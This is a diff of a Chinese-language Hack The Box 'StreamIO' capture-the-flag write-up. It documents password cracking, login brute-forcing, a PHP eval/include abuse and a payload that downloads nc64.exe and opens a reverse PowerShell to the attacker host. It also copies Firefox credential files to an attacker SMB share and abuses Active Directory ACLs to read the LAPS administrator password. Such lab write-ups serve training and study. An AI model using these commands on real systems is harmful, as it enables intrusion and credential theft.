@@ -1,7 +1,7 @@
 ---
 title: HTB-StreamIO Writeup
-date: 2026-03-19T13:00:00+08:00
-draft: true
+date: 2026-04-05T12:00:00+08:00
+draft: false
 toc: true
 images:
 tags:
@@ -455,6 +455,8 @@ yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
 
 ### Hashcat 暴力破解
 
+使用 hashcat 暴力破解获取到的用户与密码。`--user` 指定前面为用户名，`-m 0` 指定为 `md5` 格式。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ sudo hashcat --user -m 0 hash.lst /usr/share/wordlists/rockyou.txt
@@ -584,6 +586,8 @@ f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 
 ```
 
+分别储存提取的账户与密码。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ cat hash.lst| cut -d: -f1 > users
@@ -641,6 +645,8 @@ $3xybitch
 
 ```
 
+使用 crackmapexec 测试 smb 登入。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ crackmapexec smb streamio.htb -u user -p pass --no-bruteforce --continue-on-success
@@ -658,6 +664,8 @@ SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!5p
 SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!?Love?!123 STATUS_LOGON_FAILURE 
 SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!!sabrina$ STATUS_LOGON_FAILURE 
 ```
+
+均无法登入，修改数据格式。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -708,6 +716,8 @@ Victoria:!5psycho8!
 yoshihide:66boysandgirls..
 ```
 
+使用 hydra 破解。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ hydra -C userspass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed" 
@@ -721,11 +731,17 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 10:39:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 10:39:20
 ```
 
+成功破解出一个账户 `yoshihide`，密码是 `66boysandgirls..`，尝试进行登入。
+
+在之前爆破出来的 `admin` 页面发现是一个后台管理系统，点击不同的选项在 url 处会显示不同的参数。
+
 ![](Pasted%20image%2020260324225127.png)
 
 ![](Pasted%20image%2020260324225314.png)
 
 ![](Pasted%20image%2020260324225325.png)
+
+可能还有未暴露出来的参数，使用 wfuzz 尝试进行爆破。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -755,9 +771,19 @@ Requests/sec.: 94.32320
 
 ```
 
+爆破出来一个新的参数 `debug`。
+
+## 文件包含利用
+
+尝试使用 `debug` 进行调试，显示这个选项仅允许开发者使用。
+
 ![](Pasted%20image%2020260324230342.png)
 
+尝试调试 `index.php`，界面多出一个错误信息 `ERROR`。
+
 ![](Pasted%20image%2020260324230500.png)
+
+进行目录爆破尝试发现更多目录。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -820,15 +846,19 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 75m    30000/30000   7/s     https://streamio.htb/admin/Fonts/
 ```
 
-`master.php`
+爆破出一个新的页面 `master.php`，使用 `debug` 进行调试，发现这个界面包含所有的数据。
 
 ![](Pasted%20image%2020260325221408.png)
+
+在调试语境下为了读取到源码而不是执行源码，使用伪协议 `php://filter/convert.base64-encode/resource=` 尝试调试 `master.php` ， `php://filter` 是 PHP 内置的流过滤器为协议，并将读取到的文件内容进行 base64 编码。
 
 ```bash
 https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
 ```
 
 ![](Pasted%20image%2020260330170023.png)
+
+将读取到的数据保存至本地。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -941,11 +971,26 @@ echo(" ---- ERROR ---- ");
 ?>                               
 ```
 
+阅读源码发现 `include` 参数未做任何过滤。
+
+```bash
+if(isset($_POST['include']))
+{
+if($_POST['include'] !== "index.php" ) 
+eval(file_get_contents($_POST['include']));
+else
+echo(" ---- ERROR ---- ");
+```
+
+准备好可用的 `nc64.exe`，准备执行反弹 shell。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ ls -liah nc64.exe 
 2764208 -rwxrwxr-x 1 kali kali 45K Mar 30 05:21 nc64.exe
 ```
+
+编写一个脚本，使用 powershell 下载 kali 中的 `nc64.exe`，保存至 `programdata` 下，然后回连至 kali。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -957,6 +1002,8 @@ system('powershell -c wget http://10.10.16.58/nc64.exe -outfile \\programdata\\n
 system('\\programdata\\nc64.exe -e powershell 10.10.16.58 443');
 ```
 
+执行 `shell.py` 获得的 `yoshihide` 的权限。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ curl -X POST 'https://streamio.htb/admin/?debug=master.php' -k -b 'PHPSESSID=o39friqont7cboifpts1bnjbq0' -d 'include=http://10.10.16.58/shell.py'                  
@@ -964,6 +1011,10 @@ system('\\programdata\\nc64.exe -e powershell 10.10.16.58 443');
 ```
 
 ![](Pasted%20image%2020260330174302.png)
+
+## 获得 nikk37 权限
+
+之前的渗透过程中多次使用到数据库，在 `treamio.htb` 主界面尝试搜索数据库相关的信息。
 
 ```bash
 PS C:\inetpub> cd streamio.htb
@@ -984,11 +1035,17 @@ dir -recurse *.php | select-string -pattern "database"
 search.php:15:$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
 ```
 
+找到很数据库凭据 `db_admin:B1@hx31234567890`、`db_user:B1@hB1@hB1@h` ，使用 mssql 自带的 sqlcmd 查询数据。
+
+寻找 sqlcmd 的位置。
+
 ```bash
 PS C:\inetpub> where.exe sqlcmd.exe
 where.exe sqlcmd.exe
 C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
 ```
+
+使用 sqlcmd 查询本地 MSSQL实例 `localhost` 中，指定 SQL 用户名为 `db_admin`，密码为 `B1@hx31234567890`，数据库名为之前发现的  `streamio_back`。
 
 ```bash
 PS C:\inetpub\streamio.htb\admin> sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select name from sys.tables;"
@@ -999,6 +1056,11 @@ movies
 users                                                                                                                           
 
 (2 rows affected)
+```
+
+ tables 有两个，显然 users 可能更有价值，先查看 users 中的信息。
+
+```bash
 PS C:\inetpub\streamio.htb\admin> sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
 sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
 id          username                                           password                                          
@@ -1014,6 +1076,8 @@ id          username                                           password
 
 (8 rows affected)
 ```
+
+查询到许多账号密码，保存至 kali。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1032,6 +1096,8 @@ id          username                                           password
 
 ```
 
+进一步处理数据。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ cat user_creds_raw | awk -F ' ' '{print $2":"$3}' | tee user_creds
@@ -1045,6 +1111,8 @@ William:d62be0dc82071bccc1322d64ec5b6c51
 Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
 
 ```
+
+使用 hashcat 破解凭据。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1122,6 +1190,8 @@ Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
 Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 ```
 
+查看有家目录的用户。
+
 ```bash
 PS C:\users> dir
              dir
@@ -1142,13 +1212,9 @@ d-----        2/26/2022   9:48 AM                nikk37
 d-r---        2/22/2022   1:33 AM                Public
 ```
 
+使用 evil-winrm 获得 `nikk37` 的权限。
+
 ```bash
-┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
-└─$ hashcat --help | grep 'user'
-     --username                 |      | Enable ignoring of usernames in hashfile             |
-  29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
-  25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
-                                                                                                                                                                        
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i streamio.htb
                                         
@@ -1162,6 +1228,10 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
 streamio\nikk37
 ```
+
+## 获得 JDgodd 权限
+
+下载 `winpeas.exe` 并执行，输出结果为 `out.txt`。
 
 ```bash
 *Evil-WinRM* PS C:\programdata\apps> powershell -c wget http://10.10.16.58/winpeas.exe -outfile winpeas.exe
@@ -1203,12 +1273,19 @@ Info: Download successful!
 2765013 -rw-rw-r-- 1 kali kali 134K Mar 31 03:58 out.txt
 ```
 
+在 linpeas 的扫描结果中发现 Firefox 可能可以被利用。
+
 ```bash
 ╔══════════╣ Looking for Firefox DBs
 1801   │ ╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
 1802   │     Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
 1803   │ ╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
 ```
+
+根据提示找到 firefox 存放 `key4.db` 与 `logins.json` 文件的地址 `C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default`。
+
+- key4.db 是 firefox 的一个数据库，用于储存加密的敏感数据，如密码、证书和加密密钥
+- logins.json 保存了登入凭据，使用 key4.db 加密
 
 ```bash
 *Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default> pwd
@@ -1298,14 +1375,7 @@ d-----        2/22/2022   2:40 AM                storage
 -a----        2/22/2022   2:42 AM            141 xulstore.json
 ```
 
-```bash
-*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.16.58\Enil /u:malus malus
-The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.16.58\enil
-*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.16.58\Enil
-
-```
+ kali 建立 smb 服务，将文件从靶机中拿回。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1353,6 +1423,19 @@ KeyboardInterrupt:
 └─$ ls -liah logins.json 
 2774744 -rwxr-xr-x 1 root root 2.1K Mar 28  2022 logins.json
 ```
+
+```bash
+*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.16.58\Enil /u:malus malus
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.16.58\enil
+*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.16.58\Enil
+
+```
+
+将两个文件放在 firefoxs 文件夹下。
+
+使用 `firepwn` 破解凭据。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1437,6 +1520,8 @@ https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
 
+将破解完的凭据保存到本地。
+
 ```bash
 ┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ vim firefox_creds
@@ -1448,6 +1533,8 @@ https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
 https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
+
+将账号密码提取出来单独存放。
 
 ```bash
 ┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1464,6 +1551,8 @@ n1kk1sd0p3t00:)
 paddpadd@12
 password@12
 ```
+
+使用 crackmapexec 进行 smb 批量登入尝试。用户 `yoshihide:password@12` 可以登入 smb。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1486,6 +1575,8 @@ SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:n
 SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
 SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE
 ```
+
+进行 winrm 批量登入尝试，均失败。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1543,6 +1634,8 @@ WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\JDgodd:p
 
 ```
 
+登入 smb 未发现有价值的内容。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ smbmap -H streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'                      
@@ -1571,6 +1664,18 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections
 ```
+
+### bloodhound 渗透
+
+使用 bloodhound 进行信息收集。
+
+- domains 为 1，结构简单
+- computers 为 1，只有一台 DC 机器
+- users 用户为 8
+- groups 数量为 54
+- gpos 为 4，存在组策略
+- ous 为 1
+- trusts 为 0，无域信任关系
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -1663,7 +1768,7 @@ There may be a short delay until the server is ready.
 
 ![](Pasted%20image%2020260401151334.png)
 
-使用 `Add to Owned` 添加用户。
+使用 `Add to Owned` 将 `jdgodd` 添加用户。
 
 ![](Pasted%20image%2020260401153329.png)
 
@@ -1675,59 +1780,86 @@ There may be a short delay until the server is ready.
 
 ![](Pasted%20image%2020260401154337.png)
 
+点击具体路径查看做法。
+
+![](Pasted%20image%2020260405195733.png)
+
+#### 获取 WriteOwner
+
+```bash
+*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('streamio\jdgodd', $SecPassword)
+```
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps> . C:\programdata\apps\PowerView.ps1
+*Evil-WinRM* PS C:\programdata\apps> Set-DomainObjectOwner -Credential $Cred -Identity 'CORE STAFF' -OwnerIdentity jdgodd
+*Evil-WinRM* PS C:\programdata\apps> Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CORE STAFF' -PrincipalIdentity jdgodd -Rights All
+*Evil-WinRM* PS C:\programdata\apps> Add-DomainGroupMember -Credential $Cred -Identity 'CORE STAFF' -Members jdgodd
+*Evil-WinRM* PS C:\programdata\apps> Get-DomainGroupMember -Identity 'CORE STAFF'
+
+
+GroupDomain             : streamIO.htb
+GroupName               : CORE STAFF
+GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
+MemberDomain            : streamIO.htb
+MemberName              : JDgodd
+MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
+```
+
+#### 获取 Owns
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+*Evil-WinRM* PS C:\programdata\apps> $Cred = New-Object System.Management.Automation.PSCredential('streamio\jdgodd', $SecPassword)
+*Evil-WinRM* PS C:\programdata\apps> Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CORE STAFF' -Rights WriteMembers
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainGroupMember -Identity 'CORE STAFF'
+
+
+GroupDomain             : streamIO.htb
+GroupName               : CORE STAFF
+GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
+MemberDomain            : streamIO.htb
+MemberName              : JDgodd
+MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
+MemberObjectClass       : user
+MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
+```
+
+#### 获取 ReadLAPSPassword
+
+```bash
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainComputer DC -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
+
+cn ms-mcs-admpwdexpirationtime
+-- ---------------------------
+DC          134199755942461512
+```
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
-└─$ la -lish PowerView.ps1 
-2782461 756K -rw-rw-r-- 1 kali kali 753K Apr  2 09:19 PowerView.ps1
-```
-
-```bash
-*Evil-WinRM* PS C:\programdata> powershell -c wget http://10.10.16.58/PowerView.ps1 -outfile PowerView.ps1
-*Evil-WinRM* PS C:\programdata> dir
-
-
-    Directory: C:\programdata
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d---s-        3/28/2022   2:53 PM                Microsoft
-d-----        2/25/2022  11:17 PM                Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38
-d-----        3/28/2022   2:53 PM                Package Cache
-d-----         5/9/2022   6:03 PM                regid.1991-06.com.microsoft
-d-----        9/15/2018  12:19 AM                SoftwareDistribution
-d-----        3/28/2022   4:46 PM                ssh
-d-----        2/22/2022   1:34 AM                USOPrivate
-d-----        2/22/2022   1:34 AM                USOShared
-d-----        2/22/2022   1:35 AM                VMware
--a----         4/2/2026   1:23 PM         770279 PowerView.ps1
-```
-
-```bash
-*Evil-WinRM* PS C:\programdata> .\PowerView.ps1
-*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
-*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',$pass)
-```
-
-```bash
-*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
-*Evil-WinRM* PS C:\programdata>  Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
-*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
-```
-
-```bash
-┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
-└─$ ldapsearch -H ldap://10.129.13.8 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwds
+└─$ ldapsearch -x -H ldap://10.129.15.25 \
+  -D 'jdgodd@streamio.htb' \
+  -w 'JDg0dd1s@d0p3cr3@t0r' \
+  -b 'DC=streamio,DC=htb' \
+  '(cn=DC)' ms-mcs-admpwd
 # extended LDIF
 #
 # LDAPv3
-# base <DC=streamIO,DC=htb> with scope subtree
-# filter: (ms-MCS-AdmPwd=*)
-# requesting: ms-MCS-AdmPwds 
+# base <DC=streamio,DC=htb> with scope subtree
+# filter: (cn=DC)
+# requesting: ms-mcs-admpwd 
 #
 
 # DC, Domain Controllers, streamIO.htb
 dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
+ms-Mcs-AdmPwd: 6d0aX1[6d/x;30
+
+# DC, Topology, Domain System Volume, DFSR-GlobalSettings, System, streamIO.htb
+dn: CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System
+ ,DC=streamIO,DC=htb
 
 # search reference
 ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb
@@ -1742,35 +1874,44 @@ ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb
 search: 2
 result: 0 Success
 
-# numResponses: 5
-# numEntries: 1
+# numResponses: 6
+# numEntries: 2
 # numReferences: 3
 ```
 
-```bash
-
-```
+得到 `administrator` 的密码是 `6d0aX1[6d/x;30`。
 
 ```bash
+┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
+└─$ evil-winrm -i 10.129.15.25 -u administrator -p '6d0aX1[6d/x;30'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+streamio\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> gci c:\Users\ -Filter *.txt -File -Recurse
 
-```
 
-```bash
+    Directory: C:\Users\Martin\Desktop
 
-```
 
-```bash
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         4/5/2026  12:00 PM             34 root.txt
 
-```
 
-```bash
+    Directory: C:\Users\nikk37\Desktop
 
-```
 
-```bash
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         4/5/2026  12:00 PM             34 user.txt
 
-```
-
-```bash
-
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\Users\Martin\Desktop\root.txt
+1f50fe01********687a739d5bff4
 ```
